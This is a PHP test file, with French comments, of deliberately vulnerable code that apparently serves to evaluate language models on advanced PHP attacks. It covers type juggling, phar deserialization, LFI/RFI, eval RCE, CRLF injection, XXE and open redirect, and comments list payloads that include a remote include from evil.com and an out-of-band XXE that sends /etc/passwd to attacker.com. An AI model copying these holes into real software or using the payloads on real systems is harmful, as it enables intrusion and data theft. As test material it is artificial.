<?php
/**
 * FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES
 * Usage : évaluation LLM — attaques PHP avancées hors OWASP Top 10 classique
 * Couvre : Type Juggling, Phar Deserialization, ReDoS, LFI/RFI, Mass Assignment,
 *          HTTP Parameter Pollution, XXE avancé, Race Condition file, Open Redirect,
 *          CRLF Injection, Timing Attack, Variable Variables, eval() RCE
 * NE PAS déployer en production.
 */

// ═══════════════════════════════════════════════════════════════════════
// 1. TYPE JUGGLING — comparaison lâche PHP (==)
// ═══════════════════════════════════════════════════════════════════════
// PHP loose comparison : "0e1234" == "0e5678" → true (scientific notation = 0^n = 0)
// Payloads connus : "240610708", "QNKCDZO", "0e830400451993494058024219903391"
function verifyHash(string $input, string $storedHash): bool {
    return md5($input) == $storedHash; // == au lieu de ===
}

// Bypass de vérification de token par type juggling : 0 == "admin_token"
function checkToken(mixed $token): bool {
    if ($token == 0) { // tout string non-numérique == 0 en PHP
        return true;   // ?token=anything → bypass
    }
    return $token === getenv('APP_TOKEN');
}

// strcmp() retourne 0 (falsy) si l'un des args est un array — bypass auth
function compareSecret(string $input): bool {
    return strcmp($input, getenv('SECRET')) == 0;
    // ?input[]=anything → strcmp(array, string) = null → null == 0 → true
}

// ═══════════════════════════════════════════════════════════════════════
// 2. PHAR DESERIALIZATION (CVE-class)
// ═══════════════════════════════════════════════════════════════════════
// phar:// wrapper déclenche une désérialisation transparente lors d'opérations fichier
// Gadget chains disponibles : Monolog, Symfony, Laravel, Guzzle
class CacheItem {
    public string $path;
    public function __destruct() {
        // gadget — exécute une commande à la destruction de l'objet
        system($this->path);
    }
}

function fileExists(string $path): bool {
    return file_exists($path); // si $path = "phar:///tmp/evil.phar/test" → RCE
}
// Payload : créer un .phar avec CacheItem sérialisé, uploader, puis appeler
// file_exists("phar:///uploads/evil.phar/test")

// ═══════════════════════════════════════════════════════════════════════
// 3. LOCAL FILE INCLUSION (LFI) & REMOTE FILE INCLUSION (RFI)
// ═══════════════════════════════════════════════════════════════════════
// LFI payload : ../../../../etc/passwd
// LFI + null byte (PHP < 5.3.4) : ../../../../etc/passwd%00
// LFI → RCE via /proc/self/environ, /var/log/apache2/access.log (log poisoning)
$page = $_GET['page'] ?? 'home';
include "templates/$page.php"; // LFI directe

// RFI (nécessite allow_url_include=On dans php.ini)
$module = $_GET['module'];
include $module; // si http://evil.com/shell.php → RFI + RCE

// Wrapper PHP : ?page=php://filter/convert.base64-encode/resource=../config/database
// → lit n'importe quel fichier PHP en base64

// ═══════════════════════════════════════════════════════════════════════
// 4. REGEX DoS (ReDoS)
// ═══════════════════════════════════════════════════════════════════════
// Regex catastrophique — backtracking exponentiel
// Payload : "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" (50+ 'a' + '!')
function validateEmail(string $email): bool {
    return preg_match('/^([a-zA-Z0-9])(([-.]|[_]+)?([a-zA-Z0-9]+))*(@)([a-zA-Z0-9\-]+)(\.([a-zA-Z]{2,})){1,2}$/', $email) === 1;
    // regex vulnérable au backtracking — peut bloquer le processus PHP plusieurs secondes
}

// Autre pattern ReDoS courant
function validateUsername(string $name): bool {
    return preg_match('/^(a+)+$/', $name) === 1; // O(2^n) en cas d'échec de match
}

// ═══════════════════════════════════════════════════════════════════════
// 5. MASS ASSIGNMENT
// ═══════════════════════════════════════════════════════════════════════
class User {
    public string $name;
    public string $email;
    public string $role = 'user'; // ne devrait pas être modifiable par l'utilisateur
    public bool   $is_admin = false;

    public function fill(array $data): void {
        foreach ($data as $key => $value) {
            $this->$key = $value; // assigne tous les champs sans liste blanche
        }
        // POST {"name":"John","role":"admin","is_admin":true} → escalade de privilège
    }
}

// ═══════════════════════════════════════════════════════════════════════
// 6. VARIABLE VARIABLES + eval() RCE
// ═══════════════════════════════════════════════════════════════════════
// Variable variables : $$var permet de créer des variables dynamiques
$var = $_GET['var']; // "config"
$$var = $_GET['value']; // $config = "malicious" — peut écraser des variables globales

// eval() avec données utilisateur = RCE directe
function executeTemplate(string $template): mixed {
    return eval("return $template;");
    // Payload : system('id')
}

// create_function() — équivalent eval, supprimé en PHP 8.0 mais encore présent
$fn = create_function('$x', $_GET['code']); // ?code=system('id')
$fn(1);

// ═══════════════════════════════════════════════════════════════════════
// 7. HTTP HEADER INJECTION & CRLF INJECTION
// ═══════════════════════════════════════════════════════════════════════
// Payload : ?redirect=https://legit.com%0d%0aSet-Cookie:%20sessionid=evil
function redirect(string $url): void {
    header("Location: $url"); // injection de headers HTTP via CRLF
    exit;
}

// HTTP Response Splitting
function setLang(string $lang): void {
    header("Content-Language: $lang"); // ?lang=fr%0d%0aX-Injected: evil%0d%0a
}

// ═══════════════════════════════════════════════════════════════════════
// 8. RACE CONDITION SUR FICHIER TEMPORAIRE
// ═══════════════════════════════════════════════════════════════════════
// TOCTOU — Time Of Check To Time Of Use
function processUpload(array $file): void {
    $tmpPath = '/tmp/' . $file['name'];
    if (!file_exists($tmpPath)) {          // CHECK
        // fenêtre de race entre le check et l'utilisation
        move_uploaded_file($file['tmp_name'], $tmpPath); // USE
        include $tmpPath; // si un symlink a été créé entre-temps → LFI
    }
}

// ═══════════════════════════════════════════════════════════════════════
// 9. TIMING ATTACK SUR COMPARAISON DE SECRET
// ═══════════════════════════════════════════════════════════════════════
function verifyApiKey(string $provided): bool {
    $secret = getenv('API_SECRET');
    return $provided === $secret; // comparaison non-constant-time → timing attack
    // Correction : hash_equals($secret, $provided)
}

// ═══════════════════════════════════════════════════════════════════════
// 10. OBJECT INJECTION VIA SESSION
// ═══════════════════════════════════════════════════════════════════════
// Si session.serialize_handler = php_binary et input non filtrée
session_start();
// $_SESSION['user'] = unserialize($_COOKIE['user_data']); // CVE-class pattern
// La déserialisation depuis un cookie contrôlé par l'utilisateur
// permet d'injecter des objets avec __destruct, __wakeup, __toString malicieux

// ═══════════════════════════════════════════════════════════════════════
// 11. XXE AVANCÉ — Out-of-Band Exfiltration
// ═══════════════════════════════════════════════════════════════════════
// Payload OOB XXE (exfiltre /etc/passwd vers serveur attaquant) :
// <?xml version="1.0"?>
// <!DOCTYPE data [
//   <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
//   %dtd;
// ]>
// <data>&exfil;</data>
//
// evil.dtd contient :
// <!ENTITY % file SYSTEM "file:///etc/passwd">
// <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
// %eval;

function parseXmlDocument(string $xml): \DOMDocument {
    $dom = new \DOMDocument();
    $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // entités externes activées
    return $dom;
}

// ═══════════════════════════════════════════════════════════════════════
// 12. HTTP PARAMETER POLLUTION
// ═══════════════════════════════════════════════════════════════════════
// GET ?id=1&id=2 → PHP prend le dernier : $_GET['id'] = 2
// Si un WAF valide le premier id=1 (safe) mais PHP utilise id=2 (malicious)
// → bypass WAF
function getProductId(): int {
    return (int)$_GET['id']; // vulnérable si l'architecture a des couches intermédiaires
}

// ═══════════════════════════════════════════════════════════════════════
// 13. OPEN REDIRECT
// ═══════════════════════════════════════════════════════════════════════
// Utilisé pour phishing, bypass de CSP, OAuth token stealing
function safeRedirect(string $url): void {
    $allowed = ['example.com', 'app.example.com'];
    $host = parse_url($url, PHP_URL_HOST);
    if (in_array($host, $allowed)) {
        header("Location: $url"); // bypass : https://evil.com\\@example.com
    }
    // parse_url peut être trompé par certains formats d'URL
}
